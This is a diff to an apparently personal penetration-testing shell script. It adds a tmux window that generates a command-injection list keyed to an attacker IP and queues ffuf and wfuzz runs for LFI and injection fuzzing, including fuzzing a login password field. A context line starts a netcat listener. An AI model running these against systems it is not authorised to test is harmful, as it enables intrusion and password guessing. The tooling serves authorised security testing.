@@ -3276,6 +3276,40 @@ tmux send-keys -t PT:4.12 "nc -nlvp 9001"
 cd $folderProject
 
 
+# LFI
+cd $folderProjectWebAuthN
+# Layout
+tmux new-window -t PT:5 -n 'LFI'
+tmux split-window -v -t PT:5.0
+tmux select-pane -t "5.0"
+tmux split-window -h -t "5.0"
+tmux split-window -h -t "5.0"
+tmux split-window -v -t PT:5.3
+tmux split-window -v -t PT:5.4
+tmux select-pane -t "5.4"
+tmux split-window -h -t "5.4"
+tmux split-window -v -t PT:5.6
+# Esecuzione dei comandi nelle sottofinestre
+#Preparo il file per le command injection
+cd $folderProjectEngine
+python ./injectionGenerator.py $attackerIP injectionlist.txt
+mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
+cd $folderProjectWebAuthN
+tmux send-keys -t PT:5.0"# LFI injection automation (save burp file with name: burp.req)" Enter
+tmux send-keys -t PT:5.0 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
+tmux send-keys -t PT:5.1"# LFI injection automation (GET)" Enter
+tmux send-keys -t PT:5.1 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
+tmux send-keys -t PT:5.2 "# LFI injection automation (POST)" Enter
+tmux send-keys -t PT:5.2 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
+tmux send-keys -t PT:5.3 "# LFI: " Enter
+tmux send-keys -t PT:5.3 ""
+tmux send-keys -t PT:5.4 "# LFI: " Enter
+tmux send-keys -t PT:5.4 ""
+tmux send-keys -t PT:5.5 "# LFI: " Enter
+tmux send-keys -t PT:5.5 ""
+tmux send-keys -t PT:5.6 "# LFI: " Enter
+tmux send-keys -t PT:5.6 ""
+cd $folderProject
 
 
 
